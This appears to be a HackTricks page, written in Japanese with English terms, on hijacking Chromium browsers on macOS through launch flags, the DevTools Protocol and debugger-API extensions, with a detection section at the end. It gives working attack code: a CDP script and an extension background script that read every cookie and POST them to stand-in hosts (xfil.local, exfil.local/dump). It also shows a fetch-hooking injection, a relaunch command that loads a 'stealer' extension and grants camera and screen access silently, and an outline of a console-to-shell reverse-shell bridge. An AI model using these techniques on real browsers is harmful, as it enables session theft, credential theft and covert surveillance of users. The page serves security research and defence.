# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## 基本情報

Google Chrome、Microsoft Edge、Brave、Arc、Vivaldi、OperaなどのChromium-based browserは、同じcommand-line switches、preference files、DevTools automation interfacesを使用します。macOSでは、GUI accessを持つユーザーであれば、既存のbrowser sessionを終了し、targetのentitlementsで実行される任意のflags、extensions、DevTools endpointsを指定して再起動できます。

#### macOSでcustom flagsを指定してChromiumを起動する

macOSでは、Chromium profileごとに単一のUI instanceが維持されるため、instrumentationには通常、browserをforce-closeする必要があります（例：`osascript -e 'tell application "Google Chrome" to quit'`）。Attackersは通常、`open -na "Google Chrome" --args <flags>`を使用してrelaunchし、app bundleを変更せずにargumentsをinjectできるようにします。このcommandをuser LaunchAgent（`~/Library/LaunchAgents/*.plist`）またはlogin hook内でwrapすると、reboot/logoff後にもtampered browserがrespawnされます。

#### `--load-extension` Flag

`--load-extension` flagは、unpacked extensions（comma-separated paths）をauto-loadします。`--disable-extensions-except`と組み合わせることで、legitimate extensionsをblockし、payloadだけを強制的に実行できます。Malicious extensionsは、`debugger`、`webRequest`、`cookies`などのhigh-impact permissionsをrequestし、DevTools protocolsへのpivot、CSP headersのpatch、HTTPSのdowngrade、browser起動直後のsession materialのexfiltrateを可能にします。

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

これらのswitchesは、TCPまたはpipe経由でChrome DevTools Protocol（CDP）をexposeし、external toolingからbrowserを操作できるようにします。Googleはこのinterfaceをinfostealerが広範にabuseしていることを確認しており、Chrome 136（2025年3月）以降、browserがnon-standardな`--user-data-dir`を指定して起動されない限り、default profileではこれらのswitchesがignoreされます。これにより、real profilesではApp-Bound Encryptionがenforceされますが、attackersはfresh profileをspawnし、victimにその中でauthenticateするよう強制し（phishing/triage assistance）、CDP経由でcookies、tokens、device trust states、WebAuthn registrationsをharvestできます。<sup>[[5]](#references)</sup>

#### `--user-data-dir` Flag

このflagは、browser profile全体（History、Cookies、Login Data、Preference filesなど）をattacker-controlled pathへredirectします。modern Chrome buildsと`--remote-debugging-port`を組み合わせる場合にmandatoryであり、tampered profileをisolatedに保つことで、security promptsのdisable、extensionsのauto-install、default schemesの変更を行うpre-populated `Preferences`または`Secure Preferences` filesをdropすることもできます。

#### `--use-fake-ui-for-media-stream` Flag

このswitchはcamera/mic permission promptをbypassするため、`getUserMedia`をcallするpageが即座にaccessを受け取ります。`--auto-select-desktop-capture-source="Entire Screen"`、`--kiosk`などのflags、またはCDP `Browser.grantPermissions` commandsと組み合わせることで、user interactionなしにaudio/videoのcapture、desk-share、またはWebRTC permission checksのsatisfyが可能になります。

## 実際に確認されているDelivery & Relaunch Patterns

CDP abuseは、initial payloadではなく、一般的に**post-exploitation** stageです。最近のmacOS developer-targeting campaignでは、poisoned Xcode **`Run Script` build phase**（`PBXShellScriptBuildPhase`）が使用され、victimがprojectを**built**した場合にのみcodeがexecuteされ、単にcloneまたはopenしただけでは実行されませんでした。最初のexecution後、malwareは他の`.xcodeproj` treesにもinfectし、malicious Git `pre-commit` hooksを追加し、ZIP archives内からさらにXcode projectsをsearchしました。<sup>[[3]](#references)</sup>

Chromium abuseにおいて重要なのは、attackerがbrowser binary自体をpatchする必要がないことです。短時間だけ実行されるbuild-phase / `osascript` stagerは、代わりに**browser wrapper**（LaunchAgent、login item、Dock entry、trojanized app launcherなど）をinstallし、userが起動するたびにattacker-controlled flags付きでlegitimate browserをreopenできます。<sup>[[3]](#references)</sup>

> [!TIP]
> Developer endpointsでは、`.pbxproj` files、`.git/hooks/pre-commit`、および`.xcodeproj`を含むZIPsをinspectし、予期しない`curl`、`osascript`、`xxd`、nested `base64`、またはChrome relaunch logicがないか確認してください。

## Remote Debugging & DevTools Protocol Abuse

Chromeを専用の`--user-data-dir`および`--remote-debugging-port`付きでrelaunchすると、CDP経由（例：`chrome-remote-interface`、`puppeteer`、`playwright`）でattachし、high-privilege workflowsをscript化できます。

- **Cookie/session theft:** `Network.getAllCookies`と`Storage.getCookies`は、App-Bound encryptionによって通常はfilesystem accessがblockされる場合でもHttpOnly valuesをreturnします。これは、CDPが実行中のbrowserにdecryptをrequestするためです。
- **Permission tampering:** `Browser.grantPermissions`と`Emulation.setGeolocationOverride`により、camera/mic promptsをbypassできます（特に`--use-fake-ui-for-media-stream`と組み合わせた場合）。また、location-based security checksをfalsifyすることもできます。
- **Keystroke/script injection:** `Runtime.evaluate`はactive tab内でarbitrary JavaScriptをexecuteし、credential lifting、DOM patching、navigation後もsurviveするpersistence beaconsのinjectを可能にします。<sup>[[1]](#references)</sup>
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo`と`Fetch.enable`は、disk artifactsに触れることなく、authenticated requests/responsesをreal timeでinterceptします。
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Chrome 136 は default profile 上の CDP をブロックするため、被害者が既に使用している `~/Library/Application Support/Google/Chrome` ディレクトリを staging path に copy/paste しても、decrypted cookies は得られなくなりました。代わりに、ユーザーを social-engineer して instrumented profile 内で認証させる（例: 「役立つ」サポートセッション）か、CDP-controlled network hooks を介して転送中の MFA tokens を取得します。<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

実用的な malware pattern は次のとおりです。

1. Chrome が起動するたびに userland implant または wrapper を再起動する。
2. `--remote-debugging-port=<port>` と、Chrome 136 以降では通常、組み合わせた non-default の `--user-data-dir=<dir>` を指定して legitimate browser を起動する。
3. local CDP WebSocket に接続し、`Page.addScriptToEvaluateOnNewDocument` を使用して pre-document hook を登録する helper を起動する。<sup>[[2]](#references)</sup>

この helper は site code が実行される**前**に JavaScript を inject できるため、ディスク上のファイルを patch することなく、`window.fetch`、`XMLHttpRequest`、wallet providers、または autofill flows を hook するのに適しています。<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
より強力な亜種では、browserを**host command bridge**に変える。注入されたJavaScriptがdelimiter付きの`console.log`を出力し、local helperが`Runtime.consoleAPICalled`を監視してmarkerを除去し、残りをhost shell（例: Goの`exec.Command`）経由で実行し、attackerのWebSocketを通じてstdout/stderrを返す。これにより、tabレベルのscript実行が、ほぼfilelessなreverse shellへと拡張される。<sup>[[3]](#references)</sup>

## Extension-Based Injection via Debugger API

2023年の「Chrowned by an Extension」researchでは、悪意のあるextensionが`chrome.debugger` APIを使用して任意のtabにattachし、`--remote-debugging-port`と同じDevTools権限を取得できることが実証された。<sup>[[6]](#references)</sup> これにより、元のisolation assumptions（extensionは自身のcontext内にとどまる）が破られ、次のことが可能になる。

- `Network.getAllCookies`/`Fetch.getResponseBody`を使用した、cookieおよびcredentialのサイレントな窃取。
- site permissions（camera、microphone、geolocation）の変更とsecurity interstitialのbypass。これにより、phishing pageがChrome dialogになりすませる。
- `Page.handleJavaScriptDialog`、`Page.setDownloadBehavior`、または`Security.handleCertificateError`をプログラムで操作することによる、TLS warning、download、またはWebAuthn promptのon-path tampering。

`--load-extension`/`--disable-extensions-except`を使用してextensionをloadすれば、user interactionは不要になる。このAPIをweaponizeする最小限のbackground scriptは次のようになる。
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
この extension は `Debugger.paused` events を subscribe して JavaScript variables を読み取り、inline scripts を patch し、navigation 後も存続する custom breakpoints を設定することもできます。すべてが user の GUI session 内で実行されるため、Gatekeeper と TCC は trigger されません。このため、すでに user context で execution を獲得した malware にとって、この technique は特に有効です。<sup>[[6]](#references)</sup>

## Detection & Hunting

- Chromium browsers が `--remote-debugging-port`、`--remote-debugging-pipe`、または suspicious な `--user-data-dir` を付けて起動されていないか alert します。特に parent が `bash`、`sh`、`osascript`、`xcodebuild`、または LaunchAgent helper の場合は注意します。
- helper が local CDP WebSocket を開き、`Page.addScriptToEvaluateOnNewDocument` を register した後、long-lived な outbound WebSocket/HTTPS connection を確立する短い chain を探します。
- browser の `Runtime.consoleAPICalled` activity と、attacker-supplied commands を実行する child shells または helper processes を correlate して、console-to-shell bridges を hunt します。
- developer Macs では、`.pbxproj` の `PBXShellScriptBuildPhase` entries、Git の `pre-commit` hooks、Dock/login item relaunchers、および ZIP に含まれる Xcode projects を確認し、browser wrapper installation を探します。
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### ツール

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - payload extension を使用した Chromium の起動を自動化し、インタラクティブな CDP hooks を公開します。
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - macOS operators 向けに、traffic interception と browser instrumentation に重点を置いた類似のツールです。
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - `--remote-debugging-port` インスタンスが起動している場合に、Chrome DevTools Protocol の dump（cookies、DOM、permissions）を script 化する Node.js library です。

### 例
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
ツールリンクでさらに多くの例を確認できます。

## 参考文献

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: A Deep Dive Into the Latest XCSSET Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) on X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
